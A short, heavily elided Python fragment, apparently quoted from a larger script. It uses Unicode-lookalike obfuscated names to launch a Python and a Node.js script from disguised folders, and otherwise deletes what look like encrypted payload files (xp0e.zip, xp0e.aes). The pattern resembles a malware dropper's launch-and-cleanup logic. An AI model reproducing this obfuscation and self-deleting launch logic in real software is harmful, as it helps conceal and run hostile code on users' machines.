...
subprocess.run(["python", "Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🐍Ş𝖎𝖕𝖍𝖔𝖓/🐍𝖛𝖑𝖐𝖕𝖞.py"], check=True, stdout=subprocess.PIPE).stdout
...
if ᴠʟᴋʏʀᴇi is not None:
    ...
    try:
        ...
        if ᴠʟᴋʏʀᴇi in YYUCCitinZfgQdrclRPOP:
            ...
            os.system('node --no-warnings Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌/ᴋᴜɴᴀɪ.js')
        else:
            os.remove("xp0e.zip")
            os.remove("xp0e.aes")
            os.remove("xp0edoc.py")
